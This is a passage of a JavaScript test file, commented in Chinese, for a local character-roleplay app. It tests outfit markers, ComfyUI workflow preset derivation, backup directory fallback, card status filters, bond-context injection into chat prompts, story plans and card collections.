  assert.equal(saved[0].patch.activeId, 'o2', '要真的把当前这套改成泳装');

  const miss = await service.applyOutfitMarkers({ characterId: 'c1', content: '[OUTFIT: 不存在的套装]' });
  assert.equal(miss.applied[0].ok, false);
  assert.equal(miss.changed, false);

  const noWardrobe = createComfyService({
    settings: { 'comfy.executionMode': 'server' },
    ports: { comfyStore: { getOutfits: () => null, saveOutfits: () => null }, getSettings: () => ({ 'comfy.executionMode': 'server' }) },
  });
  const empty = await noWardrobe.applyOutfitMarkers({ characterId: 'c9', content: '[换装: 泳装]' });
  assert.equal(empty.changed, false);
  assert.match(empty.applied[0].reason, /衣柜/);
});

test('按本机模型生成预设：认得"拆开加载"，采样参数也跟着母版走', () => {
  const workflow = {
    71: { class_type: 'VAELoader', inputs: { vae_name: 'qwen_image_vae.safetensors' } },
    72: { class_type: 'CLIPLoader', inputs: { clip_name: 'qwen_3_06b_base.safetensors', type: 'stable_diffusion', device: 'default' } },
    73: { class_type: 'UNETLoader', inputs: { unet_name: 'anima_baseV10.safetensors', weight_dtype: 'default' } },
    75: { class_type: 'KSampler', inputs: { seed: 1, steps: 30, cfg: 5, sampler_name: 'er_sde', scheduler: 'simple', denoise: 1, model: ['95', 0], positive: ['79', 0], negative: ['78', 0], latent_image: ['77', 0] } },
    77: { class_type: 'EmptyLatentImage', inputs: { width: 1024, height: 1536, batch_size: 1 } },
    95: { class_type: 'LoraLoaderModelOnly', inputs: { lora_name: 'x.safetensors', strength_model: 0.8, model: ['73', 0] } },
  };
  const profile = deriveLoaderProfile(workflow);
  assert.equal(profile.style, 'split');
  assert.equal(profile.modelName, 'anima_baseV10.safetensors');
  assert.equal(profile.sampler.sampler_name, 'er_sde');
  assert.deepEqual(profile.size, { width: 1024, height: 1536 });

  const presets = presetsFromProfile(profile, { sourceName: '母版' });
  assert.equal(presets.length, 5);
  const portrait = presets.find((item) => item.id === 'derived-portrait').workflow;
  assert.equal(portrait['1'].class_type, 'UNETLoader');
  assert.equal(portrait['2'].class_type, 'CLIPLoader');
  assert.equal(portrait['3'].class_type, 'VAELoader');
  assert.deepEqual(portrait['4'].inputs.clip, ['2', 0], '文本编码器接 CLIPLoader');
  const sampler = Object.values(portrait).find((node) => node.class_type === 'KSampler');
  assert.equal(sampler.inputs.sampler_name, 'er_sde', '采样参数跟母版一致');
  assert.deepEqual(sampler.inputs.model, ['1', 0]);
  assert.deepEqual(Object.values(portrait).find((node) => node.class_type === 'VAEDecode').inputs.vae, ['3', 0]);
  assert.equal(Object.values(presets.find((item) => item.id === 'derived-hires').workflow).filter((node) => node.class_type === 'KSampler').length, 2);

  // 一体化 checkpoint 也能生成
  const cp = deriveLoaderProfile({
    1: { class_type: 'CheckpointLoaderSimple', inputs: { ckpt_name: 'sd_xl_base_1.0.safetensors' } },
    5: { class_type: 'KSampler', inputs: { steps: 20, cfg: 6, sampler_name: 'dpmpp_2m', scheduler: 'karras' } },
  });
  assert.equal(cp.style, 'checkpoint');
  assert.equal(presetsFromProfile(cp, { sourceName: 'x' })[0].workflow['1'].class_type, 'CheckpointLoaderSimple');

  // 认不出来 → unknown
  assert.equal(deriveLoaderProfile({ 1: { class_type: 'CLIPTextEncode', inputs: { text: 'x' } } }).style, 'unknown');
});

test('工具箱：备份目录可以指到别处（比如同步盘），建不出来就退回默认', () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    const store = createBackupStore({ rawDb: db.db, repo: db.repo, dataDir: dir, logger: silentLogger });
    assert.equal(store.dir(), path.join(dir, 'backups'), '默认还是数据目录下的 backups');
    const first = store.create({ label: '默认目录' });
    assert.ok(existsSync(path.join(dir, 'backups', `${first.name}.zip`)));

    // 设置里填一个自定义目录（同步盘就长这样）→ 新备份落到那儿
    const custom = mkdtempSync(path.join(tmpdir(), 'tavern-backups-'));
    writeSettings(db.repo, { 'data.backupDir': custom });
    assert.equal(store.dir(), custom, '填了就放那儿');
    const second = store.create({ label: '同步盘' });
    assert.ok(existsSync(path.join(custom, `${second.name}.zip`)), '新备份落到自定义目录');
    assert.ok(store.list().some((item) => item.name === second.name), '列表也跟着走');
    assert.ok((store.readBytes(second.name)?.length ?? 0) > 0, '读得回来');
    assert.ok(store.find(second.name), '也找得到');
    try {
      rmSync(custom, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    } catch {
      // 删不掉不影响断言
    }

    // 目录建不出来（路径中间是个文件）→ 退回默认，不能让备份整个挂掉
    const blocker = path.join(dir, 'blocker.txt');
    writeFileSync(blocker, 'x');
    writeSettings(db.repo, { 'data.backupDir': path.join(blocker, 'sub') });
    assert.equal(store.dir(), path.join(dir, 'backups'), '建不出来就退回默认');
    const third = store.create({ label: '退回默认' });
    assert.ok(existsSync(path.join(dir, 'backups', `${third.name}.zip`)));
  } finally {
    cleanup();
  }
});

test('角色卡：剧本状态（想玩 / 在玩 / 已完结 / 搁置）能存能筛', () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    assert.ok(db.repo.get('SELECT MAX(version) AS v FROM schema_migrations').v >= 19, 'schema 至少到 v19');
    assert.ok(db.repo.get("SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'character_status'"), 'character_status 表要建出来');
    assert.deepEqual(CARD_STATUSES.map((item) => item.id), ['', 'wish', 'playing', 'done', 'paused']);
    assert.equal(normalizeStatus('playing'), 'playing');
    assert.equal(normalizeStatus('乱写的值'), '', '认不出来的一律当没标');
    assert.equal(normalizeStatus(undefined), '');

    const store = createCardStore({ repo: db.repo, dataDir: dir });
    const a = store.insert({ name: '甲', data: { name: '甲' }, status: 'playing' });
    const b = store.insert({ name: '乙', data: { name: '乙' } });
    assert.equal(a.status, 'playing');
    assert.equal(b.status, '');
    assert.equal(store.get(a.id).status, 'playing');

    const playing = store.list({ status: 'playing' });
    assert.equal(playing.items.length, 1);
    assert.equal(playing.items[0].id, a.id);
    assert.equal(store.list({ status: 'done' }).items.length, 0);
    assert.equal(store.list({}).items.length, 2, '不传 status 就是全部');

    assert.equal(store.update(a.id, { status: 'done' }).status, 'done');
    assert.equal(store.list({ status: 'playing' }).items.length, 0);
    assert.equal(store.list({ status: 'done' }).items.length, 1);
  } finally {
    cleanup();
  }
});

test('玩卡区服务：下一轮带上羁绊（认识第几天 / 上次见面），关掉就不带', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createChatStore({ repo: db.repo });
    const seen = [];
    const models = {
      async *chat(_providerId, args = {}) {
        // 整段参数都记下来：注入（导演 / 羁绊）走的是 system，不在 messages 里
        seen.push(JSON.stringify(args));
        yield { type: 'text', text: '喵。' };
        yield { type: 'usage', usage: { promptTokens: 1, completionTokens: 1, totalTokens: 2 } };
      },
      async complete() {
        return { text: 'ok' };
      },
    };
    const ports = {
      chatStore: store,
      models,
      resolveBinding: () => ({ providerId: 'p1', model: 'mock', params: {}, source: 'default', sourceTitle: '全局默认' }),
      providerParams: () => ({}),
    };
    const { chat } = createPlayingServices({ settings: { stateEnabled: false }, ports });
    const created = await chat.create({ title: '羁绊', character: { name: '阿狸', description: '猫', first_mes: '喵。' } });
    const drain = async (gen) => {
      for await (const _chunk of gen) {
        // 跑完这一轮
      }
    };

    await drain(chat.send(created.id, { text: '在吗' }));
    // 开场白已经落了一条"角色说过的话"，所以第一轮就该有羁绊
    assert.ok(seen.at(-1).includes('羁绊'), '有开场白之后就该带羁绊');
    assert.ok(seen.at(-1).includes('认识第 1 天'), '今天第一次，就是第 1 天');
    await drain(chat.send(created.id, { text: '又来了' }));
    assert.ok(seen.at(-1).includes('羁绊'), '第二轮要带上羁绊');

    const off = createPlayingServices({ settings: { stateEnabled: false, 'chat.bondContext': false }, ports });
    await drain(off.chat.send(created.id, { text: '还在' }));
    assert.ok(!seen.at(-1).includes('羁绊'), '关掉之后不再注入');

    // 纯函数：日期边界
    assert.equal(describeBond({}), null, '没历史就不给');
    assert.ok(describeBond({ name: '甲', firstAt: '2026-01-01T00:00:00Z', lastAt: '2026-01-01T00:00:00Z', count: 3, now: new Date('2026-01-01T09:00:00') }).includes('今天已经聊过了'));
    assert.ok(describeBond({ name: '甲', firstAt: '2026-01-01T00:00:00Z', lastAt: '2026-01-02T00:00:00Z', count: 3, now: new Date('2026-01-03T09:00:00') }).includes('上次见面是昨天'));
    assert.ok(describeBond({ name: '甲', firstAt: '2026-01-01T00:00:00Z', lastAt: '2026-01-01T00:00:00Z', count: 3, now: new Date('2026-01-05T09:00:00') }).includes('上次见面是 4 天前'));

    // 存储统计：按角色 / 成员任一命中都算
    const bondKey = created.members?.[0]?.characterId ?? created.members?.[0]?.id;
    const stats = store.bondStats(bondKey);
    assert.ok(stats && stats.count >= 2, `要数出这个角色说过几句，实际：${JSON.stringify(stats)}`);
    assert.equal(store.bondStats(null), null);
  } finally {
    cleanup();
  }
});

test('坑本：记下来、改状态、一键开演变成角色卡', async () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    assert.ok(db.repo.get('SELECT MAX(version) AS v FROM schema_migrations').v >= 20, 'schema 至少到 v20');
    assert.ok(db.repo.get("SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'story_plans'"), 'story_plans 表要建出来');
    assert.deepEqual(PLAN_STATUSES.map((item) => item.id), ['idea', 'drafting', 'ready', 'archived']);
    assert.equal(normalizePlanStatus('drafting'), 'drafting');
    assert.equal(normalizePlanStatus('瞎写'), 'idea', '认不出来就当"只是个想法"');

    const cards = createCardStore({ repo: db.repo, dataDir: dir });
    const cardService = createCardService({ ports: { cardStore: cards } });
    const plans = createPlansService({ ports: { plansStore: createPlansStore({ repo: db.repo }), cards: cardService } });

    // 空的时候好说
    assert.deepEqual(plans.list(), { items: [], total: 0 });
    assert.throws(() => plans.save({ summary: '没标题' }), /标题/);

    const plan = plans.save({ title: '雨夜书店', summary: '狐狸老板娘', tags: ['狐狸', '书店'], note: '想演重逢' });
    assert.equal(plan.status, 'idea');
    assert.deepEqual(plan.tags, ['狐狸', '书店']);
    assert.equal(plans.list().total, 1);

    const drafting = plans.save({ ...plan, status: 'drafting' });
    assert.equal(drafting.status, 'drafting');
    assert.equal(drafting.createdAt, plan.createdAt, '改的时候不该把创建时间改掉');
    assert.equal(plans.list({ status: 'drafting' }).total, 1);
    assert.equal(plans.list({ status: 'idea' }).total, 0);

    // 开演：按坑本里的设定建卡，并记下 card_id
    const card = await plans.promote(plan.id);
    assert.equal(card.name, '雨夜书店');
    assert.equal(card.data.description, '狐狸老板娘');
    assert.deepEqual(card.tags, ['狐狸', '书店']);
    const after = plans.get(plan.id);
    assert.equal(after.cardId, card.id, '要记下转成了哪张卡');
    assert.equal(after.status, 'ready');
    assert.equal(plans.list().total, 1, '开演之后记录还在');

    assert.equal(plans.remove(plan.id), true);
    assert.equal(plans.list().total, 0);
    assert.throws(() => plans.remove('不存在'), /没有这个坑/);
  } finally {
    cleanup();
  }
});

test('剧本合集：两级分类、一张卡能进多个分类、删分组不删卡', () => {
  const { db, dir, cleanup } = makeTempDb();
  try {
    assert.ok(db.repo.get("SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'card_collections'"), 'card_collections 表要建出来');
    const cards = createCardStore({ repo: db.repo, dataDir: dir });
    const one = cards.insert({ name: '甲', data: { name: '甲' } });
    const two = cards.insert({ name: '乙', data: { name: '乙' } });
    const collections = createCollectionsService({ ports: { collectionsStore: createCollectionsStore({ repo: db.repo }) } });

    assert.deepEqual(collections.list().items, []);

    const group = collections.save({ name: '雪国' });
    const categoryA = collections.save({ name: '主线', parentId: group.id });
    const categoryB = collections.save({ name: '支线', parentId: group.id });
    assert.equal(collections.list().items.length, 3);
    assert.equal(categoryA.parentId, group.id);

    // 只分两级
    assert.throws(() => collections.save({ name: '再套一层', parentId: categoryA.id }), /两级/);
    assert.throws(() => collections.save({ name: '挂到不存在的分组', parentId: 'nope' }), /没有这个分组/);
    assert.throws(() => collections.save({ name: '   ' }), /名字/);

    // 一张卡同时进两个分类
    collections.addCards(categoryA.id, [one.id, two.id]);
    collections.addCards(categoryB.id, [one.id]);
    assert.deepEqual(collections.cards(categoryA.id).items.map((card) => card.name).sort(), ['乙', '甲'].sort());
    assert.equal(collections.cards(categoryB.id).items.length, 1);
    assert.equal(collections.list().items.find((c) => c.id === categoryA.id).cardCount, 2);

    collections.removeCards(categoryA.id, [two.id]);
    assert.equal(collections.cards(categoryA.id).items.length, 1);

    // 删分组：分类跟着走，卡本身留着
    collections.remove(group.id);
    assert.equal(collections.list().items.length, 0);
    assert.ok(cards.get(one.id) && cards.get(two.id), '删合集不能把卡删掉');
  } finally {
    cleanup();
  }
});

const result = await run();
process.exitCode = result.failed ? 1 : 0;
